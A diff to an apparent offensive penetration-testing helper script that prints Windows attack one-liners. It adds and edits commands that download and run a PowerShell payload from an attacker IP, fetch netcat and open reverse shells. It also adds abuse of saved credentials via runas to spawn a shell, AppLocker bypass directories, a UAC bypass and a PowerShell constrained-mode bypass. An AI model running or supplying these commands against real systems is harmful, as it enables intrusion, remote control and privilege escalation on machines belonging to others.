@@ -58,7 +58,7 @@ function display_revshell
         local base64_command=`echo "${command}" | iconv --to-code UTF-16LE | base64 -w 0`
 
         echo "powershell iex(New-Object System.Net.WebClient).DownloadString('http://${ip_addr}:${webserver_port}/rev.ps1')"
-        #echo "powershell curl http://${ip_addr}:${webserver_port}/rev.ps1 | powershell"
+        echo "powershell curl http://${ip_addr}:${webserver_port}/rev.ps1 -o rev.ps1; powershell ./rev.ps1"
         echo "powershell -enc ${base64_command}"    
         echo "powershell (new-object System.Net.WebClient).DownloadFile('http://${ip_addr}:${webserver_port}/nc64.exe','C:\temp\nc64.exe')"
         echo
@@ -252,7 +252,7 @@ function privilege_escalation_windows
 
     echo_yellow "[*] Reverse shells"
     echo "powershell iex(New-Object System.Net.WebClient).DownloadString('http://${ip_addr}:${webserver_port}/rev.ps1')"
-    #echo "powershell curl http://${ip_addr}:${webserver_port}/rev.ps1 | powershell"
+    echo "powershell curl http://${ip_addr}:${webserver_port}/rev.ps1 -o rev.ps1; powershell ./rev.ps1"
     echo "powershell -enc ${base64_command}"
     echo "powershell (new-object System.Net.WebClient).DownloadFile('http://${ip_addr}:${webserver_port}/nc64.exe','C:\temp\nc64.exe')"
     echo "c:\\temp\\nc64.exe -e powershell ${ip_addr} ${local_port}"
@@ -270,21 +270,52 @@ function privilege_escalation_windows
     echo "gci -force -recurse . | select fullname" 
     echo "gci -force -recurse c:\users\. | select fullname" 
     echo "TODO: - find .bat, .ps1"  
-	echo ""
+    echo ""
 
     echo_yellow "[*] Single Enum & Privesc Script"
     echo "powershell iex(New-Object System.Net.WebClient).DownloadString('http://${ip_addr}:${webserver_port}/single-enum-privesc.ps1')"
+    echo ""
 
     # alternate data streams
-    echo ""
     echo_yellow "[*] Alternate Data Streams"
     echo "Get-Item -path .\hello.txt -stream *	// show ADS
 Get-Content -path .\hello.txt -stream hidden  // get content"
+    echo ""
+
+    # access rights
+    echo_yellow "[*] ICACLS - access rights"
+    echo "icacls c:\temp\file.txt"
+
+    # crypted files
+    echo_yellow "[*] Cipher /c"
+    echo "cipher /c file.txt"
+
+    # saved creds
+    echo_yellow "[*] Saved credentials"
+    echo "runas /user:Administrator /savecred \"nc64.exe -e cmd.exe ${ip_addr} ${local_port}\" "
+	echo ""
+
+    # Applocker bypass
+    echo_yellow "[*] Applocker bypass"
+    echo 'C:\Windows\Tasks' 
+    echo 'C:\Windows\Temp' 
+    echo 'C:\Windows\System32\spool\PRINTERS'
+    echo 'C:\Windows\System32\spool\SERVERS'
+    echo 'C:\Windows\System32\spool\drivers\color'
+    echo 'C:\Windows\SysWOW64\FxsTmp'
+    echo 'C:\Windows\SysWOW64\com\dmp'
 
     # UAC bypass
-    echo ""
     echo_yellow "[*] UAC Bypass - need Administrators group"
     echo "net use z:\ 127.0.0.1\c$ && cd z:\users\administrator\desktop"
+
+    echo_yellow "[*] Powershell constraint mode bypass"
+	echo "powershell -version 2"
+
+    # get .net versions
+    echo_yellow "[*] Get .NET versions"
+    echo 'get-item c:\windows\microsoft.net\framework64\...\clr.dll | fl  // FileVersion'
+
 
     # Powershell remoting
     echo ""
